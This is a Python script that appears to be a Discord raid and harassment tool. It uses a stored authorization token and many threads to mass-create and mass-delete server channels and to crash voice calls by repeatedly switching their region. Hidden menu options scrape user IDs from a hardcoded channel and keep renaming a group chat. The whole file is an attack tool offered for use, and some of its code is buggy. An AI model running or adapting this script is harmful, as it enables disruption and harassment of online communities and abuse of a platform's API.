import requests
import threading
import os
from colorama import Fore
import random
import string
from itertools import cycle
import ctypes
import time
import json
os.system('color')



amount = 0

devmode = False

with open('config.json') as json_file:
    data = json.load(json_file)


if data['devmode'] == 'True':
    devmode = True
else:
    devmode = False

threads = data['threads']
token = data['discord_authorization']
global amount

if token == '':
    print(f"{Fore.RED}Critical Error: No token found in txt file or the token is dead")
    print('Quitting in 5 Seconds')

    time.sleep(5)
    quit()

with open('iloveujess.txt', 'r+', encoding='utf-8') as f:
    rotateid = cycle(f.read().splitlines())

print("""
[1] Channel Generator
[2] Channel Deleter
[3] Call Crasher""")

choice = input('>>>> ')
devmode = True

def channelspam():
    while True:
        try:
            json = {
                'parent_id': parentid,
                'name': name,
                'type': '2'
            }

            createchannel = requests.post(f'https://discord.com/api/v8/guilds/{serverid}/channels', json=json,
                                          headers={'authorization': token})
            if createchannel.status_code == 201:
                print(f'{Fore.GREEN}[ Channel')
                with open('iloveujess.txt', 'a') as f:
                    f.write(createchannel.json()['id'] + "\n")
        except Exception as err:
            if devmode:
                print(err)
            else:
                x = 'a'
def channeldelete():
    while True:
        try:
            currid = next(rotateid)
            createchannel = requests.delete(f' https://discord.com/api/v8/channels/{currid}', headers={
                'authorization': token})
            if createchannel.status_code == 200:
                print(f'Channel Deleted: {currid}')
        except Exception as err:
            if devmode:
                print(err)
            else:
                x = 'a'
def callcrasher():
    while True:
        try:
            regions = [
                'us-south',
                'us-west',
                'us-east',
                'us-central',
                'singapore',
                'russia',
                'sydney'
            ]
            randregion = random.choice(regions)
            changeregion = requests.patch(f'https://discord.com/api/v8/channels/{callid}/call',
                                          headers={"content-type": "application/json", 'authorization': token},
                                          json={'region': randregion})
            if changeregion.status_code == 204:
                print(f'{Fore.GREEN}[ + ] Call: {callid} changed to: {randregion}{Fore.RESET}')
                time.sleep(0.65)
        except Exception as err:
            if devmode:
                print(err)
            else:
                x = 'a'
def massdm():
    while True:
        try:
            scrapeids = requests.get('https://discord.com/api/v8/channels/795496557473693726/messages?limit=50', headers={'authorization': token})
            for thing in scrapeids.json():
                print(thing['author']['id'])
        except Exception as err:
            if devmode:
                print(err)
            else:
                x = 'a'
def changegroupname():
    while True:
        try:
            if amount == 0:
                currtext = 'LUV'
            if amount == 1:
                currtext = 'L'
            elif amount == 2:
                currtext = 'LU'
            elif amount == 3:
                currtext = 'LUV'
            elif amount == 4:
                amount = 0
            amount += 1
            changename = requests.patch(f'https://discord.com/api/v8/channels/{groupid}', json={'name': currtext}, headers={'authorization': token})
            time.sleep(3)
            print(changename.text)
        except Exception as err:
            if devmode:
                print(err)
            else:
                x = 'sex'
if choice == '1':
    serverid = input('Enter a serverID: ')
    parentid = input('Enter a parentID: ')
    name = input('Enter a channel name: ')
    for i in range(threads):
        t1 = threading.Thread(target=channelspam).start()
if choice == '2':
    for i in range(threads):
        t1 = threading.Thread(target=channeldelete).start()
if choice == '3':
    callid = input('Enter a callID: ')
    for i in range(threads):
        t1 = threading.Thread(target=callcrasher).start()
if choice == '4':
    for i in range(threads):
        t1 = threading.Thread(target=massdm).start()
if choice == '5':
    groupid = input('Enter a groupID: ')
    for i in range(threads):
        t1 = threading.Thread(target=changegroupname).start()
